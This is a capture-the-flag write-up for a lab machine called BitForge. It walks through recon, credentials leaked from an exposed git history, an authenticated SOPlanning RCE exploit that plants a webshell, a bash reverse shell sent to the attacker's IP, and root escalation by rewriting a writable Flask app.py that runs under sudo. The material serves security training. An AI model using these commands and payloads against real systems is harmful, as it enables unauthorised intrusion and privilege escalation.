# CTF Writeup: BitForge

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
 nmap -A -p- --min-rate 10000 192.168.240.186
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-01 10:10 -0500
Nmap scan report for 192.168.240.186
Host is up (0.027s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:5a:a9:66:65:3e:d0:b8:9d:a5:16:8c:e8:16:37:e2 (ECDSA)
|_  256 9b:2d:1d:f8:13:74:ce:96:82:4e:19:35:f9:7e:1b:68 (ED25519)
80/tcp   open   http       Apache httpd
|_http-title: Did not follow redirect to http://bitforge.lab/
| http-git: 
|   192.168.240.186:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: created .env to store the database configuration 
|_http-server-header: Apache
3306/tcp open   mysql      MySQL 8.0.40-0ubuntu0.24.04.1
|_ssl-date: TLS randomness does not represent time
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.40-0ubuntu0.24.04.1
|   Thread ID: 15
|   Capabilities flags: 65535
|   Some Capabilities: FoundRows, IgnoreSpaceBeforeParenthesis, ODBCClient, IgnoreSigpipes, DontAllowDatabaseTableColumn, SupportsCompression, LongPassword, Support41Auth, SupportsLoadDataLocal, Speaks41ProtocolOld, Speaks41ProtocolNew, SupportsTransactions, SwitchToSSLAfterHandshake, InteractiveClient, ConnectWithDatabase, LongColumnFlag, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: \x19m\x1E-u\x11zv}7b=93\x02AhZ0]
|_  Auth Plugin Name: caching_sha2_password
| ssl-cert: Subject: commonName=MySQL_Server_8.0.40_Auto_Generated_Server_Certificate
| Not valid before: 2025-01-15T14:38:11
|_Not valid after:  2035-01-13T14:38:11
Aggressive OS guesses: Linux 5.0 - 5.14 (98%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (98%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.13 (93%), Linux 5.0 (92%), OpenWrt 22.03 (Linux 5.10) (92%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (90%), Linux 4.15 (90%), Linux 2.6.32 - 3.10 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   27.05 ms 192.168.45.1
2   27.04 ms 192.168.45.254
3   27.17 ms 192.168.251.1
4   27.22 ms 192.168.240.186

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.61 seconds
```

Judging from the recon scan we can see that the website running on port 80 failed to redirect to an domain called "bitforge.lab". Let's map it to our target ip in our local dns file /etc/hosts.

```
sudo echo "192.168.240.186 bitforge.lab" | sudo tee -a /etc/hosts
```

The recon scan also discovered an exposed /.git repository. Let's download it utilizing git-dumper.

```
git-dumper http://bitforge.lab .
```

I retrieved an /index.php and /login.php endpoint.

Upon inspecting the source code of the index.php, I discovered an hidden subdomain.

```
<a class="nav-link" href="http://plan.bitforge.lab">EMPLOYEE PLANNING PORTAL</a>
```

Let's map it to our target ip in our local dns file.

```
nano /etc/hosts
192.168.240.186 bitforge.lab plan.bitforge.lab
```

Upon inspecting the subdomain, we are getting greeted with version information of the Web Application "Simple Online Planning v1.52.01.

## Vulnerability Assessment

Upon searching for CVE's we discovered an Authenticated RCE Exploit.

```
searchsploit Simple Online Planning                              
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
SOPlanning 1.52.01 (Simple Online Planning Tool) - Remote Code Execution (RCE) (Authenticated)              | php/webapps/52082.py
------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Since we need to be authenticated for this exploit, let's try & search for default credentials.

```
admin:admin
```

Unfortunately those didn't work. I'm assuming we can find credentials within the git repository.

Upon inspecting the /logs directory we found an interesting hint in the HEAD file.

```
cat HEAD       
0000000000000000000000000000000000000000 f4f6de69896baa2ecbb1084e604be81343833bfa McSam Ardayfio <mcsam@bitforge.lab> 1734367314 +0000  commit (initial): setting up login and index page for the BitForge website
f4f6de69896baa2ecbb1084e604be81343833bfa 18833b811e967ab8bec631344a6809aa4af59480 McSam Ardayfio <mcsam@bitforge.lab> 1734367388 +0000  commit: added the database configuration
18833b811e967ab8bec631344a6809aa4af59480 eaf6c81951775e4202e40762b3300cc936cf4df1 McSam Ardayfio <mcsam@bitforge.lab> 1734367445 +0000  commit: removing db-config due to hard coded credentials
eaf6c81951775e4202e40762b3300cc936cf4df1 1ce700a508aec3d5e4d4aa1b128a662f2c85f5ad McSam Ardayfio <mcsam@bitforge.lab> 1734367488 +0000  commit: created .env to store the database configuration
```

The 2nd commit stated that an config file was removed which had credentials inside, let's use the git functionality in order to view this commit.

```
git show eaf6c81951775e4202e40762b3300cc936cf4df1
commit eaf6c81951775e4202e40762b3300cc936cf4df1
Author: McSam Ardayfio <mcsam@bitforge.lab>
Date:   Mon Dec 16 16:44:05 2024 +0000

    removing db-config due to hard coded credentials

diff --git a/db-config.php b/db-config.php
deleted file mode 100644
index c1d2b96..0000000
--- a/db-config.php
+++ /dev/null
@@ -1,19 +0,0 @@
-<?php
-// Database configuration
-$dbHost = 'localhost'; // Change if your database is hosted elsewhere
-$dbName = 'bitforge_customer_db';
-$username = 'BitForgeAdmin';
-$password = 'B1tForG3S0ftw4r3S0lutions';
-
-try {
-    $dsn = "mysql:host=$dbHost;dbname=$dbName;charset=utf8mb4";
-    $pdo = new PDO($dsn, $username, $password);
-
-    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
-
-    echo "Connected successfully to the database!";
-} catch (PDOException $e) {
-    echo "Connection failed: " . $e->getMessage();
-}
-?>
-
```

Retrieved credentials, let's utilize them to login into the MySQL Database.

```
mysql -u BitForgeAdmin -p -h bitforge.lab --skip-ssl-verify-server-cert
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 64
Server version: 8.0.40-0ubuntu0.24.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

I selected the soplanning database and put in the following query in order to view registered accounts and there credentials.

```
MySQL [soplanning]> SELECT * from planning_user;
+-----------+----------------+---------------+-------+------------------------------------------+-------+------------------+---------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+---------------+---------+-----------+--------+--------+-------------+--------------------+-------------+-------------+------------+---------------------+------------+----------+----------------------+                                                                                                
| user_id   | user_groupe_id | nom           | login | password                                 | email | visible_planning | couleur | droits                                                                                                                                                                                                                                          | cle                              | notifications | adresse | telephone | mobile | metier | commentaire | date_dernier_login | preferences | login_actif | google_2fa | date_creation       | date_modif | tutoriel | tarif_horaire_defaut |                                                                                                
+-----------+----------------+---------------+-------+------------------------------------------+-------+------------------+---------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+---------------+---------+-----------+--------+--------+-------------+--------------------+-------------+-------------+------------+---------------------+------------+----------+----------------------+                                                                                                
| ADM       |           NULL | admin         | admin | 77ba9273d4bcfa9387ae8652377f4c189e5a47ee | NULL  | non              | 000000  | ["users_manage_all", "projects_manage_all", "projectgroups_manage_all", "tasks_modify_all", "tasks_view_all_projects", "lieux_all", "ressources_all", "parameters_all", "stats_users", "stats_projects", "audit_restore", "stats_roi_projects"] | dbee8fd60fd4244695084bd84a996882 | oui           | NULL    | NULL      | NULL   | NULL   | NULL        | NULL               | NULL        | oui         | setup      | 2025-01-16 14:21:15 | NULL       | NULL     |                 NULL |
| publicspl |           NULL | Guest         | NULL  | NULL                                     | NULL  | non              | 000000  | NULL                                                                                                                                                                                                                                            | 181ba036234dcccd78a2c7f540928a0f | non           | NULL    | NULL      | NULL   | NULL   | NULL        | NULL               | NULL        | oui         | setup      | 2025-01-16 14:21:15 | NULL       | NULL     |                 NULL |
| user1     |              1 | Test people 1 | NULL  | NULL                                     | NULL  | oui              | ffeb3b  | ["","","","tasks_readonly","tasks_view_all_projects","tasks_view_all_users","","","","","",""]                                                                                                                                                  | bdcf6ee6918de4347aa34b7b533119d9 | oui           | NULL    | NULL      | NULL   | NULL   | NULL        | NULL               | NULL        | oui         | setup      | 2025-01-16 14:21:15 | NULL       | NULL     |                 NULL |
| user2     |              1 | Test people 2 | NULL  | NULL                                     | NULL  | oui              | 4dabf5  | ["","","","tasks_readonly","tasks_view_all_projects","tasks_view_all_users","","","","","",""]                                                                                                                                                  | cb284acc53164275d8cbb61fb090daf8 | oui           | NULL    | NULL      | NULL   | NULL   | NULL        | NULL               | NULL        | oui         | setup      | 2025-01-16 14:21:15 | NULL       | NULL     |                 NULL |
| user3     |              2 | Test people 3 | NULL  | NULL                                     | NULL  | oui              | 1fcb27  | ["","","","tasks_readonly","tasks_view_all_projects","tasks_view_all_users","","","","","",""]                                                                                                                                                  | 2eb523102046905d137e264e1eda0a43 | oui           | NULL    | NULL      | NULL   | NULL   | NULL        | NULL               | NULL        | oui         | setup      | 2025-01-16 14:21:15 | NULL       | NULL     |                 NULL |
+-----------+----------------+---------------+-------+------------------------------------------+-------+------------------+---------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+---------------+---------+-----------+--------+--------+-------------+--------------------+-------------+-------------+------------+---------------------+------------+----------+----------------------+
5 rows in set (0.027 sec)

MySQL [soplanning]>
```

Since the admin password is encoded, let's crack them.

Unfortunately it didn't work. Another Method is to change the password which is encoded inside of the database to another one choosen by you.

```
MySQL [soplanning]> UPDATE planning_user SET password='df5b909019c9b1659e86e0d6bf8da81d6fa3499e' WHERE user_id='ADM';
Query OK, 1 row affected (0.037 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

The encoded password which we updated is "admin".

Now we were able to successfully log into the admin panel.

```
admin:admin
```

Since we can now run the initial exploit, let's try it.

Ran the exploit and gained shell as user "www-data".

```
python3 52082.py -t http://plan.bitforge.lab/www -u admin -p admin
[+] Uploaded ===> File 'p3l.php' was added to the task !
[+] Exploit completed.
Access webshell here: http://plan.bitforge.lab/www/upload/files/kj6h5o/p3l.php?cmd=<command>
Do you want an interactive shell? (yes/no) yes
soplaning:~$
```

The Shell is very weak, let's try & get an better shell.

Started up listener on port 80.

```
nc -lvnp 80
```

Executed the following command.

```
soplaning:~$ /bin/bash -c 'bash -i >& /dev/tcp/192.168.45.191/80 0>&1'
```

Gained RCE.

```
nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.240.186] 33018
bash: cannot set terminal process group (1375): Inappropriate ioctl for device
bash: no job control in this shell
<.bitforge.lab/public_html/www/upload/files/kj6h5o$
```

## Privilege Escalation

Performed Shell Hardening.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo ; fg ; reset
stty columns 200 rows 200
export TERM=xterm
```

Enumerating Users on the target server.

```
www-data@BitForge:/$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
jack:x:1001:1001::/home/jack:/bin/bash
```

I tried viewing the /etc/crontab file, but there were no cronjobs inside who are modified.

I downloaded pspy32 onto the target system and ran it.

Upon investigating running processes, I found an hidden mysqldump process in which we got credentials for user "jack".

```
2026/01/01 16:44:01 CMD: UID=0     PID=2697   | /usr/sbin/CRON -f -P 
2026/01/01 16:44:01 CMD: UID=0     PID=2698   | /usr/sbin/CRON -f -P 
2026/01/01 16:44:01 CMD: UID=0     PID=2699   | mysqldump -u jack -pj4cKF0rg3@445 soplanning
```

Logged into user "jack" with jack:j4cKF0rg3@445

```
www-data@BitForge:/tmp$ su jack
Password: 
jack@BitForge:/tmp$
```

Retrieved local.txt in /home/jack directory.

```
35ae963f45a4f7d4d20dcdeac13becd9
```

Upon inspecting jack's sudo permissions, he is able to run the flask_password_changer application with root privileges.

```
jack@BitForge:/tmp$ sudo -l
Matching Defaults entries for jack on bitforge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, !env_reset

User jack may run the following commands on bitforge:
    (root) NOPASSWD: /usr/bin/flask_password_changer
```

Let's execute it first, to see if it spits out any errors.

```
jack@BitForge:/tmp$ sudo /usr/bin/flask_password_changer -h
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:9000
Press CTRL+C to quit
```

It provides us with the information that it's running on port 9000 internally!

Let's portforward the service utilizing ssh.

```
ssh -L 8081:127.0.0.1:9000 jack@bitforge.lab
The authenticity of host 'bitforge.lab (192.168.240.186)' can't be established.
ED25519 key fingerprint is: SHA256:GYats4sApIm2CiXiv6CqklOr+LDIDCrer/01h6J9yFg
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:89: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'bitforge.lab' (ED25519) to the list of known hosts.
jack@bitforge.lab's password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-51-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Jan  1 04:48:06 PM UTC 2026

  System load:  0.0               Processes:               170
  Usage of /:   55.7% of 9.75GB   Users logged in:         0
  Memory usage: 47%               IPv4 address for ens192: 192.168.240.186
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

78 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

jack@BitForge:~$
```

Upon analyzing the binary, we realise that it's actually an .sh script.

```
jack@BitForge:~$ cat /usr/bin/flask_password_changer
#!/bin/bash
cd /opt/password_change_app 
/usr/local/bin/flask run --host 127.0.0.1 --port 9000 --no-debug
```

Which cd's into /opt/password_change_app/ directory.

Upon further analysis we understood that this directory is writable.

Let's modify app.py to following:

```
root@BitForge:/opt/password_change_app# cat app.py
import os

os.setuid(0)
os.system("/bin/bash -p")
```

Ran the following command and gained root shell.

```
jack@BitForge:/opt/password_change_app$ sudo /usr/bin/flask_password_changer
root@BitForge:/opt/password_change_app#
```

Retrieved proof.txt in /root directory.

```
ec8b9e254211ff59dfe653e2734ec92b
```
